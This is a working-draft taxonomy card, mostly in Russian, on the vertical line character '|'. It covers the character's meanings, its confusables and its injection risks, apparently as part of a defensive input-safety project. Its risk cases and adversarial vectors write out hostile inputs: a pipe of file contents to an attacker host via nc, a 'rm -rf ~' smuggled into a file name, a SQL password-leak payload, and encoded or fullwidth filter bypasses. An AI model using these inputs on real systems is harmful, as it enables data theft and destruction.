PRIVATE AUTHORED PROJECT / COMMERCIAL USE PROHIBITED

DOCUMENT_ID: SIGN_CORE_CARD_VERTICAL_LINE_U007C_GEN3_v0_3_RU
DOCUMENT_TYPE: SIGN_CORE_CARD
TEMPLATE_LINE: GEN3_v0_3
DOCUMENT_STATUS: WORKING_DRAFT
STATUS: WORKING_DRAFT / NOT_LOCKED / NOT_RUNTIME / NOT_VALIDATOR / NOT_PRODUCTION / NOT_CONVEYOR_RUN
SOURCE_TEMPLATE: SIGN_CORE_CARD_TEMPLATE_GEN3_v0_3_EN
BASED_ON_RULESET: SIGN_CORE_CARD_CONVEYOR_RULES_GEN3_v0_3_EN
TRANSLATION_NOTE: Русский оригинал (authoritative). Английское зеркало — SIGN_CORE_CARD_VERTICAL_LINE_U007C_GEN3_v0_3_EN. Кодпоинты, имена полей и формулы идентичны. ЧЕРНОВИК для нашей работы (Vakhter); конвейер — отдельный проект.

============================================================
0. UNIVERSALITY
============================================================
BOUND_TO_SPECIFIC_SIGN: YES
AFTER_USE_RESIDUE: FORBIDDEN
SIGN_DATA_IS_SESSION_ONLY: YES

============================================================
1. COMMON_CONVEYOR_DISCIPLINE
============================================================
CONVEYOR_DISCIPLINE_VERSION: v0_3
RUN_CARD_REQUIRED_BEFORE_LOCK: YES
LOCKED_WORKING_CORE_SELF_ASSIGNMENT: FORBIDDEN
MODEL_FAMILY_DIVERSITY_REQUIRED: YES
ADVERSARIAL_EVIDENCE_REQUIRED: YES
MUTATION_CHECK_REQUIRED: YES
LIMITATION_STATEMENT_REQUIRED: YES
AFTER_RUN_RESIDUE: FORBIDDEN
STATUS_PROGRESSION_TRACKER:
  WORKING_DRAFT: YES
  STRUCTURAL_PREFLIGHT_PASS: PENDING
  CONVEYOR_REVIEW_PASS: PENDING
  WORKINGLY_CLOSED: PENDING
  SIMULATION_GATE_TIER: TIER_1
  SIMULATION_GATE_PASSED: PENDING
  ARTIFACT_CONFIRMED: PENDING
LIMITATION_STATEMENT (standard):
  CONVEYOR_PASS ≠ VALIDATION
  MODEL_CONSENSUS ≠ TRUTH
  INJECTION_TEST_PASS ≠ SECURITY_PROOF
  GUARDS_HOLD_FOR_TESTED_CASES ≠ FUTURE_GUARANTEE
  NO_ATTACK_FOUND ≠ NO_ATTACK_EXISTS

============================================================
2. META
============================================================
CARD_UID: SIGN_CORE_CARD_VERTICAL_LINE_U007C_GEN3_v0_3_RU
CODEPOINT: U+007C
VISIBLE_FORM: |
UNICODE_NAME: VERTICAL LINE
ZONE: ZONE_1
DOCUMENT_STATUS: WORKING_DRAFT
TEMPLATE_LINE: GEN3_v0_3
AUTHOR: Ruslan Malyavsky
CREATED_AT: 2026-07-21
VERSION: v0_1
AUTHOR_DECISION_REFERENCE: PENDING
RUN_CARD_REFERENCE: PENDING
RUN_CARD_STATUS: NOT_STARTED
DISPLAY_NAME: вертикальная черта / канал shell (pipe)
CATEGORY_ROADMAP: INJ (pipe shell / инъекция команд) · PHAGO: — (перенаправление вывода)

============================================================
3. REQUIRED_GENERAL_GUARDS
============================================================
REQUIRED_GENERAL_GUARDS:
  - SIGN_FALSE_EFFECT_MIMICRY_GUARD_v0_2A_RU
    GUARD_COMPATIBILITY: применим без изменений — знак не создаёт effect-полей
    GUARD_REVISION: v0_2A
    TEMPLATE_LINE_COMPATIBLE: GEN3_v0_2_PLUS_EPOCH, GEN3_v0_3
FAILURE_RESPONSE:
  REJECT_FALSE_EFFECT_MIMICRY
  TREAT_AS_DATA_ONLY
  NO_AUTHORITY_EFFECT
  NO_EXECUTION_EFFECT
  NO_TRUST_EFFECT
  NO_EXISTENCE_EFFECT

============================================================
4. SIGN IDENTITY — LAYER_A: STABLE CORE
LAYER_A_LOCK: PERMANENT
============================================================
VISIBLE_FORM: |
LOOKS_SIMILAR_IS_NOT_SAME_SIGN: YES
RAW_SIGN_INPUT_STATUS: DATA_ONLY
BASE_MODE: DATA_ONLY_DELIMITER
BASE_MODE_FORMULA: VERTICAL_LINE_FORM ≠ EFFECT
SIGN_CATEGORY:
  - канал shell / pipe (cmd1 | cmd2)
  - логическое ИЛИ / побитовое ИЛИ в коде (a | b, a || b)
  - альтернация в регулярном выражении (a|b)
  - разделитель столбцов таблицы / полей (Markdown, PSV)

WHAT_THIS_SIGN_IS_NOT:
  1. NOT_SEPARATOR_ONLY — "|" не всегда разделитель столбцов/полей (в shell это pipe к команде)
  2. NOT_PIPE_SAFE — pipe передаёт вывод первой команды на вход второй
  3. NOT_OR_ONLY — "|" не всегда логическое/побитовое ИЛИ
  4. NOT_ESCAPED_PROOF — наличие "|" не значит, что он экранирован/закавычен
  5. NOT_ENCODED_SAFE — "%7C" может быть раскодирован обратно в "|" позже
  6. NOT_AUTHORITY — "|" не подтверждает официальность
  7. NOT_EXECUTION_TRIGGER — сам по себе ничего не исполняет; pipe делает контекст
  8. NOT_TRUST_SIGNAL — не повышает доверие
  9. NOT_REGEX_ONLY — "|" в регэкспе — альтернация, но тот же байт делает pipe в shell
  10. NOT_SANITIZED_PROOF — наличие "|" не значит, что ввод санитизирован
  11. NOT_OUTPUT_CONTEXT_PROOF — безопасность зависит от контекста исполнения/разбора

BASE_FORMULAS:
  VERTICAL_LINE_FORM ≠ EFFECT
  VERTICAL_LINE_FORM ≠ SEPARATOR_ONLY_PROOF
  VERTICAL_LINE_FORM ≠ PIPE_SAFETY_PROOF
  VERTICAL_LINE_FORM ≠ OR_ONLY_PROOF
  VERTICAL_LINE_FORM ≠ ESCAPED_PROOF
  VERTICAL_LINE_FORM ≠ ENCODED_SAFETY_PROOF
  VERTICAL_LINE_FORM ≠ AUTHORITY
  VERTICAL_LINE_FORM ≠ EXECUTION_TRIGGER
  VERTICAL_LINE_FORM ≠ TRUST_SIGNAL
  VERTICAL_LINE_FORM ≠ SANITIZED_PROOF
  VERTICAL_LINE_FORM ≠ OUTPUT_CONTEXT_PROOF

============================================================
5. SEMANTIC_EPOCH_TRACKER
SEMANTIC_EPOCH_TRACKER_LOCK: REVIEWABLE
============================================================
EPOCH_TRACKER: NOT_APPLICABLE
NOTE: "|" (ZONE_1) имеет параллельные функции (pipe shell, логическое/побитовое ИЛИ, альтернация регэкспа, разделитель таблицы), сосуществующие без культурной прецессии. Полисемия стабильного знака.
LAYER_ANOMALY:
  ABSENT_PHYSICAL_LAYER: YES, уровень L1
  NOTE: ASCII-знак без жестового предшественника; функции pipe/ИЛИ/альтернации надстроены цифровой эпохой параллельно.

============================================================
6. EFFECT_FIELDS — LAYER_C: METHODOLOGICAL LAYER
LAYER_C_LOCK: SESSION
============================================================
authority_effect: NONE
trust_effect: NONE
verification_effect: NONE
proof_effect: NONE
execution_effect: NONE
permission_effect: NONE
status_effect: NONE
role_assignment_effect: NONE
runtime_effect: NONE
existence_effect: NONE
EFFECT_FIELDS_ALL_NONE: YES
CLOSED_SCHEMA: YES

============================================================
7. SAFE / RISK / CONFUSABLES / GUARDS — LAYER_B
LAYER_B_LOCK: REVIEWABLE
============================================================
SAFE_CASES:
  SAFE_CASE_001:
    INPUT: "| Name | Age |"
    CONTEXT: заголовок таблицы Markdown
    EXPECTED: INFO
    RISK: NONE
    GUARD: VERTICAL_LINE_FORM ≠ SEPARATOR_ONLY_PROOF
  SAFE_CASE_002:
    INPUT: "flags = READ | WRITE"
    CONTEXT: побитовое ИЛИ в коде (как литеральный текст)
    EXPECTED: INFO
    RISK: NONE
    GUARD: VERTICAL_LINE_FORM ≠ EFFECT
  SAFE_CASE_003:
    INPUT: "cat|dog|bird"
    CONTEXT: альтернация регэкспа (как литеральный текст)
    EXPECTED: INFO
    RISK: NONE
    GUARD: VERTICAL_LINE_FORM ≠ OR_ONLY_PROOF
  SAFE_CASE_004:
    INPUT: "a|b|c (строка данных PSV)"
    CONTEXT: список полей с разделителем pipe
    EXPECTED: INFO
    RISK: NONE
    GUARD: VERTICAL_LINE_FORM ≠ SEPARATOR_ONLY_PROOF
  SAFE_CASE_005:
    INPUT: "if (x || y)"
    CONTEXT: логическое ИЛИ в коде
    EXPECTED: INFO
    RISK: NONE
    GUARD: VERTICAL_LINE_FORM ≠ EFFECT
  SAFE_CASE_006:
    INPUT: "P(A|B) (обозначение условной вероятности)"
    CONTEXT: черта «при условии» в математическом тексте
    EXPECTED: INFO
    RISK: NONE
    GUARD: VERTICAL_LINE_FORM ≠ EFFECT

RISK_CASES:
  RISK_CASE_001:
    NAME: SHELL_PIPE_INJECTION
    INPUT: "cat file | nc attacker 4444"
    CONTEXT: pipe вывода на команду атакующего
    RISK: CRITICAL
    ATTACK: "|" передаёт вывод второй команде (эксфильтрация/исполнение)
    GUARD: VERTICAL_LINE_FORM ≠ PIPE_SAFETY_PROOF
  RISK_CASE_002:
    NAME: FILENAME_PIPE_EXEC
    INPUT: "photo.jpg| rm -rf ~"
    CONTEXT: pipe, спрятанный в имени файла, переданном в shell
    RISK: CRITICAL
    ATTACK: "|" превращает аргумент-«имя файла» в конвейер команд
    GUARD: VERTICAL_LINE_FORM ≠ SEPARATOR_ONLY_PROOF
  RISK_CASE_003:
    NAME: SQL_CONCAT_LEAK
    INPUT: "1 || (SELECT password FROM users)"
    CONTEXT: "||" конкатенация строк для утечки данных (Oracle/Postgres)
    RISK: HIGH
    ATTACK: "||" присоединяет результат подзапроса к выводу
    GUARD: VERTICAL_LINE_FORM ≠ OR_ONLY_PROOF
  RISK_CASE_004:
    NAME: ENCODED_PIPE_BYPASS
    INPUT: "cmd%7C rm -rf ~ (с поздним декодированием)"
    CONTEXT: кодированный "|" декодируется обратно перед исполнением
    RISK: HIGH
    ATTACK: %7C декодируется в "|" ПОСЛЕ проверки → конвейер
    GUARD: VERTICAL_LINE_FORM ≠ ENCODED_SAFETY_PROOF
  RISK_CASE_005:
    NAME: REGEX_ALTERNATION_BYPASS
    INPUT: "admin|root (в allow-list-регэкспе аутентификации)"
    CONTEXT: неэкранированный "|" неожиданно расширяет совпадение регэкспа
    RISK: MEDIUM
    ATTACK: "|" заставляет шаблон совпадать шире задуманного (обход аутентификации)
    GUARD: VERTICAL_LINE_FORM ≠ OR_ONLY_PROOF
  RISK_CASE_006:
    NAME: FULLWIDTH_PIPE_BYPASS
    INPUT: "cmd｜rm （полноширинный ｜ U+FF5C）"
    CONTEXT: похожий знак для обхода фильтра "|"
    RISK: MEDIUM
    ATTACK: фильтр ищет ASCII "|", нормализатор может свернуть ｜ в "|"
    GUARD: VERTICAL_LINE_FORM ≠ EFFECT

CONFUSABLES:
  CONFUSABLE_001:
    VISIBLE_FORM: ｜
    CODEPOINT: U+FF5C
    NAME: FULLWIDTH VERTICAL LINE
    RISK: HIGH
    RULE: FULLWIDTH_VERTICAL_LINE ≠ VERTICAL_LINE (обходит фильтр, ищущий ASCII "|")
  CONFUSABLE_002:
    VISIBLE_FORM: ∣
    CODEPOINT: U+2223
    NAME: DIVIDES
    RISK: MEDIUM
    RULE: DIVIDES ≠ VERTICAL_LINE
  CONFUSABLE_003:
    VISIBLE_FORM: │
    CODEPOINT: U+2502
    NAME: BOX DRAWINGS LIGHT VERTICAL
    RISK: MEDIUM
    RULE: BOX_LIGHT_VERTICAL ≠ VERTICAL_LINE
  CONFUSABLE_004:
    VISIBLE_FORM: ǀ
    CODEPOINT: U+01C0
    NAME: LATIN LETTER DENTAL CLICK
    RISK: LOW
    RULE: DENTAL_CLICK ≠ VERTICAL_LINE
  CONFUSABLE_005:
    VISIBLE_FORM: ￨
    CODEPOINT: U+FFE8
    NAME: HALFWIDTH FORMS LIGHT VERTICAL
    RISK: LOW
    RULE: HALFWIDTH_LIGHT_VERTICAL ≠ VERTICAL_LINE

CONTRADICTION_GUARDS:
  CG1:
    TRIGGER: "'|' — это всегда разделитель таблицы/полей"
    RESPONSE: VERTICAL_LINE_FORM ≠ SEPARATOR_ONLY_PROOF
    RULE: в shell "|" делает pipe вывода на вторую команду
  CG2:
    TRIGGER: "pipe просто передаёт текст, он не может ничего запустить"
    RESPONSE: VERTICAL_LINE_FORM ≠ PIPE_SAFETY_PROOF
    RULE: pipe запускает и питает вторую исполняемую программу
  CG3:
    TRIGGER: "раз ввод дошёл до исполнения, '|' уже безопасен"
    RESPONSE: VERTICAL_LINE_FORM ≠ OUTPUT_CONTEXT_PROOF
    RULE: безопасность зависит от контекста разбора/исполнения; exec через вектор аргументов
  CG4:
    TRIGGER: "'%7C' безопасен навсегда"
    RESPONSE: VERTICAL_LINE_FORM ≠ ENCODED_SAFETY_PROOF
    RULE: кодированная форма может быть декодирована обратно в "|" перед исполнением
  CG5:
    TRIGGER: "фильтр по ASCII '|' ловит все черты"
    RESPONSE: VERTICAL_LINE_FORM ≠ EFFECT
    RULE: полноширинная ｜ (U+FF5C) и box │ (U+2502) — другие кодпоинты
  CG6:
    TRIGGER: "наличие '|' значит, что ввод санитизирован"
    RESPONSE: VERTICAL_LINE_FORM ≠ SANITIZED_PROOF
    RULE: наличие знака ничего не говорит о санитизации

SEQUENCE_LAYER_BOUNDARY:
  SIGN_SAFE_ALONE ≠ SIGN_SAFE_IN_SEQUENCE: YES
  SEQUENCE_CANDIDATES:
    SC1:
      SEQUENCE: "| "
      NAME: SHELL_PIPE
      RISK_LEVEL: CRITICAL
      POSSIBLE_CONTEXTS: pipe на вторую команду shell
      REQUIRES_SEQUENCE_INTEGRATOR: YES
    SC2:
      SEQUENCE: "||"
      NAME: OR_OR_CONCAT
      RISK_LEVEL: HIGH
      POSSIBLE_CONTEXTS: OR-исполнение в shell / утечка через конкатенацию строк SQL
      REQUIRES_SEQUENCE_INTEGRATOR: YES
    SC3:
      SEQUENCE: "|&"
      NAME: PIPE_STDERR
      RISK_LEVEL: HIGH
      POSSIBLE_CONTEXTS: pipe stdout+stderr на вторую команду
      REQUIRES_SEQUENCE_INTEGRATOR: YES
  IF NOT_APPLICABLE: неприменимо — последовательности с "|" центральны для инъекции команд/pipe.

PHAGO_ENTITY_MIMICRY:
  NOT_APPLICABLE:
    REASON: "|" делает pipe/маршрутизацию вывода на другую команду, но не имитирует существование верифицированной сущности. Его риски — инъекция/pipe, а не мимикрия сущности.
    REVIEW_REQUIRED: YES

============================================================
8. ADVERSARIAL_COVERAGE — RUN_CARD SEED
============================================================
MIN_TOTAL_VECTORS: 10 (5 категорий A-E, CATEGORY_F NOT_APPLICABLE для ZONE_1)
CATEGORY_A: FORM_MANIPULATION (2)
  A1: замена ASCII "|" на полноширинный ｜ (U+FF5C) для обхода фильтра
  A2: замена на box-drawing │ (U+2502)
CATEGORY_B: CONTEXT_INJECTION (2)
  B1: pipe shell cat file | nc attacker 4444
  B2: конкатенация SQL 1 || (SELECT password FROM users)
CATEGORY_C: SEQUENCE_MANIPULATION (2)
  C1: "| " (SC1) — pipe shell
  C2: "||" (SC2) — OR-exec / утечка через конкатенацию
CATEGORY_D: SEMANTIC_MIMICRY (2)
  D1: "|" подан как безобидный разделитель таблицы внутри поля команды
  D2: "%7C" как «безопасный» кодированный текст с поздним декодированием
CATEGORY_E: PHAGO_ENTITY_MIMICRY (2)
  E1: N/A — знак не PHAGO-носитель; вектор: pipe в шаблон OS-команды
  E2: N/A — вектор: имя файла с pipe, переданное в shell
CATEGORY_F: SEMANTIC_LAYER_MANIPULATION
  NOT_APPLICABLE
  REASON: ZONE_1, у знака нет спящих/активных эпох.
ACTUAL_TOTAL_VECTORS: 10
COVERAGE_STATUS: SUFFICIENT (10 ≥ 10)

============================================================
9. MUTATION_CHECK
============================================================
MUTATION_01:
  CLAIM: "|" — всегда разделитель таблицы/полей
  EXPECTED: FAIL_SEPARATOR_ONLY_MIMICRY
  RESULT: FAIL
MUTATION_02:
  CLAIM: pipe просто передаёт текст и не может ничего запустить
  EXPECTED: FAIL_PIPE_SAFETY_MIMICRY
  RESULT: FAIL
MUTATION_03:
  CLAIM: раз ввод дошёл до исполнения, "|" уже безопасен
  EXPECTED: FAIL_OUTPUT_CONTEXT_MIMICRY
  RESULT: FAIL
MUTATION_04:
  CLAIM: "%7C" безопасен навсегда
  EXPECTED: FAIL_ENCODED_SAFETY_MIMICRY
  RESULT: FAIL
MUTATION_05:
  CLAIM: фильтр по ASCII "|" ловит все похожие черты
  EXPECTED: FAIL_CONFUSABLE_COVERAGE_MIMICRY
  RESULT: FAIL
MUTATION_06:
  CLAIM: наличие "|" доказывает санитизацию ввода
  EXPECTED: FAIL_SANITIZED_MIMICRY
  RESULT: FAIL

============================================================
10. KNOWN_OPEN_QUESTIONS
============================================================
OQ1:
  QUESTION: как нейтрализовать "|" по контексту (shell/SQL/регэксп) без ложных срабатываний на таблицах/PSV/ИЛИ?
  STATUS: CLOSED_AS_DELEGATED_TO_INTEGRATOR (exec через вектор аргументов + параметризованные запросы + экранирование регэкспа — забота интегратора/рантайма)
  BLOCKS_WORKINGLY_CLOSED: NO
  NOTE: карточка фиксирует правило «безопасность '|' решается контекстом исполнения/разбора».
ALL_OPEN_QUESTIONS_CLOSED: NO (делегировано, не блокирует)

============================================================
11. PATCH_HISTORY
============================================================
PATCH_HISTORY:
  v0_1_PATCH_01: первичное создание (Ruslan Malyavsky, 2026-07-21) — черновик по шаблону GEN3_v0_3 (Vakhter); не прогнан по конвейеру.
PATCHES_APPLIED: 1
PATCHES_VERIFIED: 0/1

============================================================
12. LIMITATION_STATEMENT
============================================================
LIMITATION_STATEMENT:
  THIS_CARD IS A WORKING_DRAFT ARTIFACT (until ARTIFACT_CONFIRMED)
  NOT A FINAL_STANDARD
  NOT A PARSER
  NOT A RUNTIME
  NOT A SECURITY_CERTIFICATE
  NOT_CONVEYOR_RUN (черновик для нашей работы; конвейер — отдельный проект)
  CONVEYOR_PASS ≠ VALIDATION
  RUN_CARD_RESULT ≠ FINAL_STATUS
  WORKINGLY_CLOSED ≠ ARTIFACT_CONFIRMED

============================================================
13. INTEGRATION_INTERFACE_STATUS
============================================================
INTEGRATION_INTERFACE_STATUS:
  STATUS: READY_PENDING_CONCRETE_INTEGRATOR
  ATTACHED_INTEGRATOR_UID: NONE_CURRENTLY_ATTACHED
  ACTIVE_MODULES_COUNT: 0
  RUNTIME_ATTACHMENT: NONE
  PERMANENT_BINDING: NO
  SESSION_ONLY_BINDING: YES
  AFTER_RUN_RESIDUE: FORBIDDEN

============================================================
END_OF_DOCUMENT
